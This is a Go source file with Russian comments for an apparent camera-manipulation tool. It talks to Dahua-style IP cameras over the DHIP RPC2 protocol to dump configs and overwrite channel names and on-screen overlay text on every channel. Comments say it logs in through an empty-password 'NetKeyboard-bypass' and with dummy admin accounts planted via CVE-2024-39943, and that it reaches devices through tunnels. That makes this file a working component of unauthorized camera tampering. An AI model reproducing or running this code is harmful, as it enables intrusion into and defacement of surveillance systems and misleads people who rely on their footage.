// title.go — замена Channel Title (имя канала) и CustomTitle (OSD-оверлей)
// через DHIP RPC2 (порт 5000). Логика osd.py: ChannelTitle и CustomTitle —
// независимые конфиги, каждый на свежем коннекте; после setConfig камера
// рестартит OSD и рвёт TCP без ответа — обрыв после записи = «отправлено,
// не подтверждено», не ошибка. CustomTitle — слотовый: texts[i] → слот i,
// лишние слоты скрываются. Паттерн: configManager.getConfig → правка
// table → setConfig, фоллбэк — flat-формат для камер без таблицы.
package dhip

import (
	"encoding/json"
	"fmt"
	"net"
	"time"
)

// DumpConfig — getConfig(name) → pretty-JSON таблицы. Для инспекции
// конфигов (ChannelTitle/VideoWidget/что угодно) в тестовых тулзах.
func DumpConfig(addr, password, name string, timeout time.Duration) (string, error) {
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return "", fmt.Errorf("connect: %w", err)
	}
	defer conn.Close()

	sess, err := dhipLogin(conn, nil, password)
	if err != nil {
		return "", fmt.Errorf("login: %w", err)
	}
	table, err := configGetTable(conn, sess, 40, name)
	if err != nil {
		return "", err
	}
	raw, err := json.MarshalIndent(table, "", "  ")
	if err != nil {
		return "", err
	}
	return string(raw), nil
}

// DumpConfigDial — getConfig(name) → pretty-JSON поверх Dialer'а (туннель).
// Юзер — admin (легаси-обёртка).
func DumpConfigDial(dial Dialer, password, name string, timeout time.Duration) (string, error) {
	return DumpConfigUserDial(dial, "admin", password, name, timeout)
}

// DumpConfigUserDial — getConfig(name) → pretty-JSON от имени указанного
// юзера (нужно для dummy-юзеров из CVE: пароль хешируется с именем).
func DumpConfigUserDial(dial Dialer, user, pass, name string, timeout time.Duration) (string, error) {
	conn, err := dial()
	if err != nil {
		return "", fmt.Errorf("connect: %w", err)
	}
	defer conn.Close()

	var sess int
	if user != "" {
		sess, err = dhipLoginAs(conn, nil, user, pass)
	} else {
		sess, err = dhipLogin(conn, nil, pass)
	}
	if err != nil {
		return "", fmt.Errorf("login: %w", err)
	}
	table, err := configGetTable(conn, sess, 40, name)
	if err != nil {
		return "", err
	}
	raw, err := json.MarshalIndent(table, "", "  ")
	if err != nil {
		return "", err
	}
	return string(raw), nil
}

// SetChannelTitle меняет имя канала (config ChannelTitle[N].Name) на ВСЕХ
// каналах. password: полный пароль admin (честный Console-логин с полными
// правами) или "" (NetKeyboard-bypass). Только порт 5000.
func SetChannelTitle(addr, password, title string, timeout time.Duration) error {
	return SetChannelTitleDial(AddrDialer(addr, timeout), password, title)
}

// SetChannelTitleDial — то же поверх Dialer'а (туннель/обычный dial).
// Юзер — admin (легаси-обёртка).
func SetChannelTitleDial(dial Dialer, password, title string) error {
	return SetChannelTitleUserDial(dial, "admin", password, title)
}

// SetChannelTitleUserDial — юзеро-явная версия: титры под ЛЮБЫМ аккаунтом
// admin-группы (в т.ч. dummy-юзером из CVE-2024-39943 — его пароль не
// подходит настоящему admin'у, раньше такие камеры молча не получали титры).
func SetChannelTitleUserDial(dial Dialer, user, password, title string) error {
	conn, err := dial()
	if err != nil {
		return fmt.Errorf("connect: %w", err)
	}
	defer conn.Close()

	sess, err := dhipLoginAs(conn, nil, user, password)
	if err != nil {
		return fmt.Errorf("login: %w", err)
	}

	// Огр камеры: ChannelTitle.Name длиннее 32 символов отклоняется
	// (setConfig result=false). Полный текст остаётся в CustomTitle.
	name := title
	if n := len([]rune(name)); n > 32 {
		r := []rune(name)
		name = string(r[:32])
	}

	table, err := configGetTable(conn, sess, 20, "ChannelTitle")
	if err != nil {
		// Устройство не отдало таблицу — фоллбэк на flat-формат по всем каналам 0..15.
		flatParams := make(map[string]any)
		for ch := 0; ch < 16; ch++ {
			flatParams[fmt.Sprintf("ChannelTitle[%d].Name", ch)] = name
		}
		r, ferr := dhipCallCollectT(conn, "configManager.setConfig", flatParams, sess, 21, nil, nil, nil, nil, CallTimeout)
		if ferr != nil {
			return fmt.Errorf("setConfig flat: %w", ferr)
		}
		if ok, _ := r["result"].(bool); !ok {
			return fmt.Errorf("setConfig flat: result=false")
		}
		return nil
	}

	for i := range table {
		if entry, ok := table[i].(map[string]any); ok {
			entry["Name"] = name
		}
	}
	if _, err := configSetTable(conn, sess, 22, "ChannelTitle", table); err != nil {
		return err
	}
	return nil
}

// SetCustomTitle включает OSD-оверлей (config VideoWidget[N].CustomTitle[0])
// с текстом title на всех каналах, позиция — из текущего конфига.
// Логика osd.py: текст идёт в слот 0, лишние слоты скрываются.
func SetCustomTitle(addr, password, title string, timeout time.Duration) (bool, error) {
	return SetCustomTitleTexts(addr, password, []string{title}, timeout)
}

// SetCustomTitleRect — то же + явная позиция Rect [x1,y1,x2,y2] в сетке
// камеры (обычно 8192x8192). Нужна для fisheye: OSD живёт в координатах
// сенсора, и положение на dewarped-картинке подбирается экспериментально.
func SetCustomTitleRect(addr, password, title string, rect []int, timeout time.Duration) (bool, error) {
	return SetCustomTitleRectTexts(addr, password, []string{title}, rect, timeout)
}

// SetCustomTitleTexts — OSD-оверлей по слотам, логика osd.py: texts[i]
// идёт в CustomTitle[i] на всех каналах; слотов больше, чем текстов —
// лишние скрываются (EncodeBlend/PreviewBlend=false), иначе камера
// продолжила бы рисовать в них старый текст. Видимость включается НЕ
// полем Show (его в конфиге НЕТ), а флагами EncodeBlend/PreviewBlend
// (как у TimeTitle, который на экране). Возвращает applied: true —
// камера подтвердила, false — отправлено без ответа (проверь дампом).
func SetCustomTitleTexts(addr, password string, texts []string, timeout time.Duration) (bool, error) {
	return SetCustomTitleRectTexts(addr, password, texts, nil, timeout)
}

// SetCustomTitleRectTexts — то же + явная позиция Rect [x1,y1,x2,y2] в
// сетке камеры, применяется только к заполненным слотам.
func SetCustomTitleRectTexts(addr, password string, texts []string, rect []int, timeout time.Duration) (bool, error) {
	return SetCustomTitleRectTextsDial(AddrDialer(addr, timeout), password, texts, rect)
}

// SetCustomTitleRectTextsDial — то же поверх Dialer'а. Юзер — admin
// (легаси-обёртка).
func SetCustomTitleRectTextsDial(dial Dialer, password string, texts []string, rect []int) (bool, error) {
	return SetCustomTitleRectTextsUserDial(dial, "admin", password, texts, rect)
}

// defaultSlotRect возвращает координаты слота в сетке 8192x8192
// Слот 0: [200, 1000, 4500, 1500]
// Слот 1: [200, 1600, 4500, 2100]
// Слот 2: [200, 2200, 4500, 2700]
// Слот 3: [200, 2800, 4500, 3300]
func defaultSlotRect(slot int) []int {
	y1 := 1000 + slot*600
	y2 := y1 + 500
	return []int{200, y1, 4500, y2}
}

func isZeroRect(r any) bool {
	if r == nil {
		return true
	}
	switch v := r.(type) {
	case []any:
		if len(v) == 4 {
			for _, val := range v {
				switch n := val.(type) {
				case float64:
					if n != 0 {
						return false
					}
				case int:
					if n != 0 {
						return false
					}
				}
			}
			return true
		}
	case []int:
		if len(v) == 4 {
			return v[0] == 0 && v[1] == 0 && v[2] == 0 && v[3] == 0
		}
	}
	return true
}

func sendFlatVideoWidget(conn net.Conn, sess int, texts []string, rect []int) (bool, error) {
	flatParams := make(map[string]any)
	for ch := 0; ch < 32; ch++ {
		for j := 0; j < 4; j++ {
			prefix := fmt.Sprintf("VideoWidget[%d].CustomTitle[%d]", ch, j)
			if j < len(texts) {
				flatParams[prefix+".Text"] = texts[j]
				flatParams[prefix+".EncodeBlend"] = true
				flatParams[prefix+".PreviewBlend"] = true
				r := rect
				if r == nil || len(r) != 4 {
					r = defaultSlotRect(j)
				}
				flatParams[prefix+".Rect[0]"] = r[0]
				flatParams[prefix+".Rect[1]"] = r[1]
				flatParams[prefix+".Rect[2]"] = r[2]
				flatParams[prefix+".Rect[3]"] = r[3]
			} else {
				flatParams[prefix+".EncodeBlend"] = false
				flatParams[prefix+".PreviewBlend"] = false
			}
		}
	}
	r, ferr := dhipCallCollectT(conn, "configManager.setConfig", flatParams, sess, 31, nil, nil, nil, nil, CallTimeout)
	if ferr != nil {
		if isRetryableConnErr(ferr) {
			return false, nil
		}
		return false, fmt.Errorf("setConfig flat VideoWidget: %w", ferr)
	}
	if ok, _ := r["result"].(bool); !ok {
		return false, fmt.Errorf("setConfig flat VideoWidget: result=false")
	}
	return true, nil
}

// SetCustomTitleRectTextsUserDial — юзеро-явная версия (см.
// SetChannelTitleUserDial: dummy-юзеры CVE-2024-39943 тоже админ-группы).
func SetCustomTitleRectTextsUserDial(dial Dialer, user, password string, texts []string, rect []int) (bool, error) {
	conn, err := dial()
	if err != nil {
		return false, fmt.Errorf("connect: %w", err)
	}
	defer conn.Close()

	sess, err := dhipLoginAs(conn, nil, user, password)
	if err != nil {
		return false, fmt.Errorf("login: %w", err)
	}

	table, err := configGetTable(conn, sess, 30, "VideoWidget")
	if err != nil {
		// Устройство не отдало таблицу разом (json decode/EOF/timeout) —
		// отправляем flat-формат VideoWidget[N].CustomTitle[M] с рабочими Rect
		return sendFlatVideoWidget(conn, sess, texts, rect)
	}

	changed := false
	for i := range table {
		entry, ok := table[i].(map[string]any)
		if !ok {
			continue
		}
		ct, ok := entry["CustomTitle"].([]any)
		if !ok || len(ct) == 0 {
			// На части устройств CustomTitle не создан по умолчанию — инициализируем 4 слота
			ct = make([]any, 4)
			for j := range ct {
				defR := defaultSlotRect(j)
				ct[j] = map[string]any{
					"Text":         "",
					"EncodeBlend":  false,
					"PreviewBlend": false,
					"Rect":         []any{defR[0], defR[1], defR[2], defR[3]},
					"FrontColor":   []any{255, 255, 255, 255},
					"BackColor":    []any{0, 0, 0, 128},
				}
			}
			entry["CustomTitle"] = ct
		}
		for j := range ct {
			c, ok := ct[j].(map[string]any)
			if !ok {
				continue
			}
			if j < len(texts) {
				c["Text"] = texts[j]
				c["EncodeBlend"] = true
				c["PreviewBlend"] = true
				if rect != nil && len(rect) == 4 {
					c["Rect"] = []any{rect[0], rect[1], rect[2], rect[3]}
				} else if isZeroRect(c["Rect"]) {
					// Если в конфиге нулевые координаты [0,0,0,0] — текст не отображается!
					// Задаём валидные координаты слота в сетке 8192x8192
					defR := defaultSlotRect(j)
					c["Rect"] = []any{defR[0], defR[1], defR[2], defR[3]}
				}
			} else {
				// слотов больше, чем текстов — прячем лишние
				c["EncodeBlend"] = false
				c["PreviewBlend"] = false
			}
			changed = true
		}
	}
	if !changed {
		return sendFlatVideoWidget(conn, sess, texts, rect)
	}
	applied, err := configSetTable(conn, sess, 31, "VideoWidget", table)
	if err != nil {
		// При сбое отправки крупной таблицы — пробуем плоский формат
		if fapplied, ferr := sendFlatVideoWidget(conn, sess, texts, rect); ferr == nil {
			return fapplied, nil
		}
		return applied, err
	}
	return applied, nil
}

// configGetTable — configManager.getConfig {"name": name} → params.table.
func configGetTable(conn net.Conn, sess, id int, name string) ([]any, error) {
	r, err := dhipCallCollectT(conn, "configManager.getConfig", map[string]any{
		"name": name,
	}, sess, id, nil, nil, nil, nil, CallTimeout)
	if err != nil {
		return nil, err
	}
	if ok, _ := r["result"].(bool); !ok {
		return nil, fmt.Errorf("getConfig %s: result=false", name)
	}
	params, _ := r["params"].(map[string]any)
	if params == nil {
		return nil, fmt.Errorf("getConfig %s: нет params", name)
	}
	table, _ := params["table"].([]any)
	if table == nil {
		return nil, fmt.Errorf("getConfig %s: нет table", name)
	}
	return table, nil
}

// configSetTable — configManager.setConfig {"name": name, "table": table}.
// Нюанс: камера после применения крупного конфига (особенно OSD/VideoWidget)
// часто рвёт TCP, НЕ отправляя ответ — уходит перезапускать OSD/энкодеры
// (внешне: i/o timeout/EOF, туннель отваливается по heartbeat и
// переподнимается). Конфиг при этом применяется — поэтому retryable-обрыв
// после отправки трактуем как успех; факт подтверждается повторным getConfig.
// возвращает applied=true, если камера ОТВЕТИЛА result=true; applied=false,
// nil — обрыв после записи (конфиг отправлен, факт НЕ подтверждён).
func configSetTable(conn net.Conn, sess, id int, name string, table any) (bool, error) {
	r, err := dhipCallCollectT(conn, "configManager.setConfig", map[string]any{
		"name":  name,
		"table": table,
	}, sess, id, nil, nil, nil, nil, CallTimeout)
	if err != nil {
		if isRetryableConnErr(err) {
			return false, nil // обрыв после записи — норма, но не подтверждено
		}
		return false, fmt.Errorf("setConfig %s: %w", name, err)
	}
	if ok, _ := r["result"].(bool); !ok {
		return false, fmt.Errorf("setConfig %s: result=false", name)
	}
	return true, nil
}

// GetChannelCountDial опрашивает количество каналов устройства (ChannelTitle или getSystemInfo).
func GetChannelCountDial(dial Dialer, user, password string) int {
	conn, err := dial()
	if err != nil {
		return 1
	}
	defer conn.Close()

	sess, err := dhipLoginAs(conn, nil, user, password)
	if err != nil {
		return 1
	}

	table, err := configGetTable(conn, sess, 20, "ChannelTitle")
	if err == nil && len(table) > 1 {
		return len(table)
	}

	info, err := dhipCallCollectT(conn, "magicBox.getSystemInfo", nil, sess, 21, nil, nil, nil, nil, 3*time.Second)
	if err == nil {
		if params, ok := info["params"].(map[string]any); ok {
			if ch, ok := params["videoInputChannels"].(float64); ok && ch > 1 {
				return int(ch)
			}
		}
		if result, ok := info["result"].(map[string]any); ok {
			if ch, ok := result["videoInputChannels"].(float64); ok && ch > 1 {
				return int(ch)
			}
		}
	}
	return 1
}
